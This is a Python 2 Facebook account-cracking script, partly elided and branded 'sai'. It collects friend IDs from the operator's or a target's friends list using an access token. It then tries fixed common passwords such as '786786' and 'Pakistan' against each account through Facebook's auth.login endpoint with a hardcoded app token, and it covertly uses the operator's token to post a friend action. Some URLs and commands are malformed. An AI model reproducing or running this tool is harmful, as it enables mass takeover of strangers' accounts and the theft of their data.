...
\033[1;95m♡╭──────────•◈•──────────╮♡\033[1;96m-sai-\033[1;95m♡╭──────────•◈•──────────╮♡
\033[1;92m..........................sai......................
\033[1;93m╔╗ ╔╗╔═╦╦╦═╗ ╔╗╔╦═╦╦╗
\033[1;93m║║ ║╚╣║║║║╩╣ ╚╗╔╣║║║║   Pakistan
\033[1;93m╚╝ ╚═╩═╩═╩═╝═ ╚╝╚═╩═╝ 
\033[1;95m♡╰──────────•◈•──────────╯♡\033[1;96msai\033[1;95m♡╰──────────•◈•──────────╯♡"""
...
CorrectUsername = "sàif"
CorrectPassword = "saikhan"
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
        ...
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:sai_khan
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;91mWrong Password"
            os.system('xdg-ope https://youtu.be/2dKZz5HfHWE /channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
    else:
        print "\033[1;94mWrong Username"
        os.system('xdg-open https://youtu.be/2dKZz5HfHWE/UCRrRgcJjsnNm5Bi5ZenRGnw')
...
def login():
	...
	try:
		...
		print "\033[1;95m♡──────────•◈•──────────♡\033[1;96msai\033[1;95m♡──────────•◈•──────────♡"
		print('	   \033[1;94m♡\x1b[1;91m》》》》》》LOGIN sai FACEBOOK《《《《《《\x1b[1;94m♡' )
		print('	' )
		...
		tik()
		try:
			br.open('https://www.facebook.com/https://www.facebook.com')
		...
		if 'save-device' in url:
			try:
				...
				a=x.hexdigest()
				data.update({'sig':a})
				url = " facebook.com//restserver.php"
				...
				os.system('xdg-open https://youtu.be/2dKZz5HfHWE/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
				requests.post('https://www.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
		...
		if 'checkpoint' in url:
			...
			print("\n\x1b[1;93mPassword/Email nb7284835@gmail.comis wrong")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()
...
def menu():
	...
	try:
		...
		login()
	try:
		otw = requests.get('https://www.facebook.com/me?access_token='+toket)
...
def pilih_super():
	...
	if peak =="":
		...
		r = requests.get("https://www.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		...
		print "\033[1;95m♡──────────•◈•──────────♡\033[1;96msai\033[1;95m♡──────────•◈•──────────╯♡"
		try:
			jok = requests.get("https://www.facebook.com/"+idt+"?access_token="+toket)
		...
		r = requests.get("https://www.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
	...
	def main(arg):
		...
		try:
			...
			pass #Dev:sai_khan
		try:
			a = requests.get('https://www.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = ('786786')
			data = urllib.urlopen("https://www.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				...
				if 'www.facebook.com' in q["error_msg"]:
					...
					pass2 = 'Pakistan'
					data = urllib.urlopen("https://www.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
	...
	p.map(main, id)
	print "\033[1;95m♡──────────•◈•──────────♡\033[1;96msai\033[1;95m♡──────────•◈•──────────♡"
	print "  \033[1;93m«---•◈•---Developed By love---•◈•---»" #Dev:sai_khan
	...
	print """
             ...
             ◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙◤
♡──────────────•◈•──────────────♡.
: \033[1;96m .....saikhan  sai ........... \033[1;93m :
♡──────────────•◈•──────────────♡.' 
                whatsapp sa
               +923239784245"""
